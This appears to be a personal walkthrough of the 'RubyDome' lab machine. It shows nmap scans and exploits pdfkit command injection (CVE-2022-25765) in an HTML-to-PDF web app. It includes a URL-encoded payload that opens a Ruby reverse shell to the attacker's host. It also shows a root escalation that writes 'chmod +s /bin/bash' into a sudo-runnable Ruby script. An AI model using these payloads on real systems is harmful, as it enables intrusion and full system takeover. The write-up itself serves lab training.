# nmap
```
┌──(kali㉿kali)-[~/PG/rubydome]
└─$ nmap -p- --min-rate 10000 192.168.157.22
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-16 01:13 EDT
Nmap scan report for 192.168.157.22
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/PG/rubydome]
└─$ nmap -p 22,3000 -sCV 192.168.157.22     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-16 01:14 EDT
Nmap scan report for 192.168.157.22
Host is up (0.011s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
|_http-title: RubyDome HTML to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds
```

![Pasted image 20250316131548](<0. Attachments/Pasted image 20250316131548.png>)

# web enum
![Pasted image 20250316131647](<0. Attachments/Pasted image 20250316131647.png>)

using our hosted server
![Pasted image 20250316131939](<0. Attachments/Pasted image 20250316131939.png>)
we get
![Pasted image 20250316132001](<0. Attachments/Pasted image 20250316132001.png>)

doing on the victim itself
![Pasted image 20250316132247](<0. Attachments/Pasted image 20250316132247.png>)

# exploit
searching for a rubydome exploit
[GitHub - UNICORDev/exploit-CVE-2022-25765: Exploit for CVE-2022–25765 (pdfkit) - Command Injection](https://github.com/UNICORDev/exploit-CVE-2022-25765?tab=readme-ov-file)

# initial access
so the exploit didnt work but using burpsuit we put in the same payload and it works
![Pasted image 20250316140910](<0. Attachments/Pasted image 20250316140910.png>)
```
http%3a//%2520`ruby+-rsocket+-e'spawn("sh",[%3ain,%3aout,%3aerr]%3d>TCPSocket.new("192.168.45.170","4444"))'`
```

![Pasted image 20250316141032](<0. Attachments/Pasted image 20250316141032.png>)

![Pasted image 20250316141055](<0. Attachments/Pasted image 20250316141055.png>)

# local.txt
![Pasted image 20250316141353](<0. Attachments/Pasted image 20250316141353.png>)

# priv esc enum
![Pasted image 20250316142035](<0. Attachments/Pasted image 20250316142035.png>)

![Pasted image 20250316142050](<0. Attachments/Pasted image 20250316142050.png>)

# priv esc
```
echo 'system("chmod +s /bin/bash")' > app.rb

sudo -u root /usr/bin/ruby /home/andrew/app/app.rb

ls -la /bin/bash

bash -p
```

![Pasted image 20250316142658](<0. Attachments/Pasted image 20250316142658.png>)

# root.txt
![Pasted image 20250316142724](<0. Attachments/Pasted image 20250316142724.png>)
